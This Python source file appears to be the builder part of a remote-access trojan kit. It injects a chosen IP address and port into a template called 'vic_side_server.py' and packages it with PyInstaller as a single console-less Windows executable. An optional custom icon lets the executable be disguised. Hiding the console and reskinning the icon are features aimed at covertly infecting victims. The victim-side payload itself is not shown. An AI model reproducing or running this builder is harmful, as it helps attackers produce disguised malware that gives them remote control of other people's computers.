import os
import shutil

GREEN = "\033[0;32m"
RESET = "\033[0m"

def create_exe(ip, port, name, icon_path=None):
    # Read the template file
    with open("Main/vic_side_server.py", "r") as file:
        code = file.read()

    # Replace placeholders with actual values
    code = code.replace("PLACEHOLDER_IP", f'"{ip}"')
    code = code.replace("PLACEHOLDER_PORT", str(port))

    # Save new customized server file
    script_name = name + ".py"
    with open(script_name, "w") as file:
        file.write(code)

    print(f"[+] Created {script_name} with IP {ip} and Port {port}")

    # If no custom icon is set, use the default one
    icon_path = f'"{icon_path}"' if icon_path else '"Main/assets/icon_exe.ico"'

    # Generate EXE using the determined icon path
    result = os.system(f'pyinstaller --onefile --icon={icon_path} --noconsole {script_name}')

    if result != 0:
        print("[-] PyInstaller encountered an error. Try running manually:")
        print(f'pyinstaller --onefile --noconsole --icon={icon_path} {script_name}')
    else:
        print(f"{GREEN}[+] EXE generated in 'dist/' folder.{RESET}")

        try:
            if os.path.exists("build"):
                shutil.rmtree("build")  # Remove 'build/' directory

            spec_file = script_name.replace(".py", ".spec")
            if os.path.exists(spec_file):
                os.remove(spec_file)  # Remove the .spec file

            print(f"{GREEN}[+] Cleanup completed. Ready to use!{RESET}")
        except Exception as e:
            print(f"[-] Error during cleanup: {e}")
